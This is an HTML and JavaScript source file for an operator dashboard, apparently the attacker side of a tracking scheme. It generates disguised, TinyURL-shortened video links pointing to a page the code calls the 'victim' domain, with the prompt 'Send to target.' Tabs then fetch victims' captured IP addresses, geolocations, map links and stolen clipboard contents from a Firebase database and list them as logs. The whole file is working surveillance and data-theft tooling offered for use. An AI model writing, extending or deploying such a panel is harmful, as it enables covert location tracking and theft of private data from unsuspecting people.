<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MA LEGEND | SUPREME HQ V6</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; padding: 15px; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 700px; }
        .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
        h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; font-size: 1.2rem; text-shadow: 1px 1px 0px #fff; }
        input { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #e0e5ec; box-shadow: inset 4px 4px 8px #cbcbe1, inset -4px -4px 8px #ffffff; outline: none; margin: 8px 0; box-sizing: border-box; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
        .btn:active { box-shadow: inset 3px 3px 6px #bcbfc5, inset -3px -3px 6px #ffffff; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
        .log-card { background: #e0e5ec; padding: 15px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 15px; border-left: 6px solid #00a884; font-size: 0.8rem; }
        .row { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid rgba(0,0,0,0.05); }
        pre { background: #1e1e1e; color: #00ffcc; padding: 10px; border-radius: 10px; overflow-x: auto; white-space: pre-wrap; font-size: 0.75rem; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="neu-card">
            <h2>MA LEGEND HQ V6</h2>
            <input type="text" id="masterKey" placeholder="Enter Secret Key (e.g. MyKey786)">
            <input type="text" id="targetUrl" placeholder="Video Link (e.g. https://youtube.com/...)">
            <button class="btn" id="genBtn" onclick="generateLink()" style="background: #00a884; color: white;">GENERATE SHORT LINK</button>
            
            <div id="linkResult" style="display:none; margin-top:15px;">
                <input type="text" id="finalLink" readonly style="color: #00a884; font-weight: bold;">
                <p style="text-align:center; font-size: 10px;">Link ready! Send to target.</p>
            </div>
        </div>

        <div class="tabs">
            <button class="btn" onclick="fetchData('tracking')">LOCATIONS</button>
            <button class="btn" onclick="fetchData('clipboard')">CLIPBOARD</button>
        </div>

        <div id="displayArea"></div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; // Aapka victim domain

        async function generateLink() {
            const key = document.getElementById('masterKey').value.trim();
            const url = document.getElementById('targetUrl').value.trim();
            if(!key || !url) return alert("Details enter karein!");

            document.getElementById('genBtn').innerText = "SHORTENING...";
            
            // Link banayein (B64 format mein)
            const longLink = `${VICTIM_PAGE}?id=${btoa(key + "|" + url)}`;
            
            try {
                // Shorten link using TinyURL
                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
                const shortUrl = await res.text();
                document.getElementById('finalLink').value = shortUrl;
            } catch(e) {
                document.getElementById('finalLink').value = longLink;
            }

            document.getElementById('linkResult').style.display = 'block';
            document.getElementById('genBtn').innerText = "GENERATE SHORT LINK";
        }

        async function fetchData(path) {
            const key = document.getElementById('masterKey').value.trim();
            if(!key) return alert("Secret Key daalein!");
            
            const area = document.getElementById('displayArea');
            area.innerHTML = "<p style='text-align:center;'>Fetching Data...</p>";
            
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            
            area.innerHTML = `<h3>${path.toUpperCase()} LOGS</h3>`;
            if(!data) return area.innerHTML += "<p>No data yet.</p>";

            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                if(path === 'tracking') {
                    area.innerHTML += `
                        <div class="log-card">
                            <div class="row"><b>üïí Time:</b> ${item.time}</div>
                            <div class="row"><b>üåê IP:</b> ${item.ip}</div>
                            <div class="row"><b>üìç Loc:</b> ${item.loc}</div>
                            <a href="${item.map}" target="_blank" style="display:block; text-align:center; margin-top:10px; color:#00a884; font-weight:bold; text-decoration:none;">[ VIEW ON MAP ]</a>
                        </div>`;
                } else {
                    area.innerHTML += `
                        <div class="log-card" style="border-left-color: #f0ad4e;">
                            <div class="row"><b>üïí Captured:</b> ${item.time}</div>
                            <pre>${item.clipData}</pre>
                        </div>`;
                }
            });
        }
    </script>
</body>
</html>
